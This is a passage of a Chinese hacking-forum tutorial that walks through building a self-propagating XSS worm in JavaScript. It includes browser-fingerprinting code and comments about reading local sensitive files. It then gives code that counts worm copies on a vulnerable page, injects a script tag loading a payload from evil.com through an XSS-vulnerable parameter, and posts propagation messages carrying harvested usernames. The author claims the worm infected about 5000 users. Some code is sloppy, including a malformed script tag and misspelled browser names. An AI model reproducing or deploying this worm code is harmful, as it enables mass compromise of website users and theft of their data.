+var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+
+for(var i=0; i<versions.length; i++) {
+
+try {
+
+request = new ActiveXObject(versions[i]);
+
+} catch(e) {}
+
+}
+
+}
+
+xmlHttpReq=request;
+复制代码可以此时添加判断浏览器具体型号和版本:   function browserinfo(){
+
+        var Browser_Name=navigator.appName;
+
+        var Browser_Version=parseFloat(navigator.appVersion);
+
+        var Browser_Agent=navigator.userAgent;
+
+        
+
+        var Actual_Version,Actual_Name;
+
+        
+
+        var is_IE=(Browser_Name=="Microsoft Internet Explorer");
+
+        var is_NN=(Browser_Name=="Netscape");
+
+        var is_Ch=(Browser_Name=="Chrome");
+
+        
+
+        if(is_NN){
+
+            if(Browser_Version>=5.0){
+
+                var Split_Sign=Browser_Agent.lastIndexOf("/");
+
+                var Version=Browser_Agent.indexOf(" ",Split_Sign);
+
+                var Bname=Browser_Agent.lastIndexOf(" ",Split_Sign);
+
+
+
+                Actual_Version=Browser_Agent.substring(Split_Sign+1,Version);
+
+                Actual_Name=Browser_Agent.substring(Bname+1,Split_Sign);
+
+            }
+
+            else{
+
+                Actual_Version=Browser_Version;
+
+                Actual_Name=Browser_Name;
+
+            }
+
+        }
+
+        else if(is_IE){
+
+            var Version_Start=Browser_Agent.indexOf("MSIE");
+
+            var Version_End=Browser_Agent.indexOf(";",Version_Start);
+
+            Actual_Version=Browser_Agent.substring(Version_Start+5,Version_End)
+
+            Actual_Name=Browser_Name;
+
+            
+
+            if(Browser_Agent.indexOf("Maxthon")!=-1){
+
+                Actual_Name+="(Maxthon)";
+
+            }
+
+            else if(Browser_Agent.indexOf("Opera")!=-1){
+
+                Actual_Name="Opera";
+
+                var tempstart=Browser_Agent.indexOf("Opera");
+
+                var tempend=Browser_Agent.length;
+
+                Actual_Version=Browser_Agent.substring(tempstart+6,tempend)
+
+            }
+
+        }
+
+        else if(is_Ch){
+
+            var Version_Start=Browser_Agent.indexOf("Chrome");
+
+            var Version_End=Browser_Agent.indexOf(";",Version_Start);
+
+            Actual_Version=Browser_Agent.substring(Version_Start+5,Version_End)
+
+            Actual_Name=Browser_Name;
+
+            
+
+            if(Browser_Agent.indexOf("Maxthon")!=-1){
+
+                Actual_Name+="(Maxthon)";
+
+            }
+
+            else if(Browser_Agent.indexOf("Opera")!=-1){
+
+                Actual_Name="Opera";
+
+                var tempstart=Browser_Agent.indexOf("Opera");
+
+                var tempend=Browser_Agent.length;
+
+                Actual_Version=Browser_Agent.substring(tempstart+6,tempend)
+
+            }
+
+        }
+
+        else{
+
+            Actual_Name="Unknown Navigator"
+
+            Actual_Version="Unknown Version"
+
+        }
+
+
+
+        navigator.Actual_Name=Actual_Name;
+
+        navigator.Actual_Version=Actual_Version;
+
+        
+
+        this.Name=Actual_Name;
+
+        this.Version=Actual_Version;
+
+    }
+
+    browserinfo();
+
+    if(navigator.Actual_Version<8&&navigator.Actual_Name=="Miscrosoft Internet Explorer"){//调用IE读取本地敏感文件}
+
+    if(navigator.Actual_Version<8&&navigator.Actual_Name=="Fire fox"){//调用Firefox读取本地敏感文件}
+
+    if(navigator.Actual_Version<8&&navigator.Actual_Name=="Opera"){//调用Opera读取本地敏感文件}
+
+    if(navigator.Actual_Version<8&&navigator.Actual_Name=="Google Chrome"){//调用Google Chrome读取本地敏感文件}
+复制代码随后可以选择调用镜象网页并且发送功能.参考上面的镜象代码
+复制代码随后可以选择调用DDOS功能.参考上面的DDOS代码
+复制代码然后,在感染和传播功能发作之前,我们要判断当前页面有没有蠕虫存在,如果有,有多少只.如果虫的数量足够,我们就不要再植入蠕虫了.只要保证一定的数量就好.xmlHttpReq.open("GET","http://vul.com/vul.jsp", false);  //读取某页面.
+
+xmlHttpReq.send(null);
+
+var resource = xmlHttpReq.responseText;
+
+var id=0;var result;
+
+var patt = new RegExp("bugbug.js","g");     //这里是蠕虫的关键词,用以确定页面有多少只虫.譬如如果你的虫在bugbug.js,那么就可以搜索这个JS在页面内的数量.
+
+while ((result = patt.exec(resource)) != null)  {
+
+id++;
+
+}
+复制代码然后,我们根据数量,来做下一步的操作.先判断,如果数量太少,我们就要让蠕虫感染起来.if(id<2){     //这里我们假设要求那个页面蠕虫的数量要有2只.
+
+no=resource.search(/my name is/);
+
+var wd='<script src="http://www.evil.com/bugbug.js"</script>';        //wd是存在XSS漏洞的变量.我们在这里写入JS代码.
+
+var post="wd="+wd;
+
+xmlHttpReq.open("POST","http://www.vul.com/vul.jsp",false);        //把感染代码 POST出去.
+
+xmlHttpReq.setRequestHeader("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*");
+
+xmlHttpReq.setRequestHeader("content-length",post.length); 
+
+xmlHttpReq.setRequestHeader("content-type","application/x-www-form-urlencoded");
+
+xmlHttpReq.send(post);
+
+}
+复制代码如果虫的数量已经足够,那么我们就执行蠕虫:else{
+
+var no=resource.search(/my name is/);     //这里是访问一个授权页面里,取得用户的名称.备份,并将来用在需要填写名称的地方
+
+var namee=resource.substr(no+21,5);     //这里是重组用户名,条件是随便写的.具体情况当然要不同获得.
+
+var wd="Support!"+namee+"<br>";        //这里就发出去了一个你指定的MESSAGE.当然,你可以把数据存入一组数组,random读取.
+
+var post="wd="+wd;
+
+xmlHttpReq.open("POST","http://vul.com/vul.jsp",false);
+
+xmlHttpReq.setRequestHeader("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*");
+
+xmlHttpReq.setRequestHeader("content-length",post.length); 
+
+xmlHttpReq.setRequestHeader("content-type","application/x-www-form-urlencoded");
+
+xmlHttpReq.send(post);                 //把传播的信息 POST出去.
+
+}
+复制代码-----------------------------------------------------总结-------------------------------------------------------------------
+
+
+
+本次教程案例中的蠕虫曾经测试成功并且感染了约5000名用户.
+蠕虫仅仅是一个载体,在这个载体上,我们可以实现各种各样的功能.
+操作JS调用COM,你的想象力有多大,蠕虫能力就有多大.这也是为什么国外黑客往往喜欢写蠕虫的原因.
+
+
+
+
+
+
+
+
+本文引用文档资料:
+
+"HTTP Request Smuggling" (Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin, June 2005)
+Other XmlHttpRequest tricks (Amit Klein, January 2003)
+"Cross Site Tracing" (Jeremiah Grossman, January 2003)
+http://armorize-cht.blogspot.com 阿碼科技非官方中文 Blog
+空虚浪子心BLOG http://www.inbreak.net
+Xeye Team http://xeye.us/
+
+
+转帖请注明版权信息:
+http://bbs.tian6.com/thread-12711-1-1.html
+By racle@tian6.com 
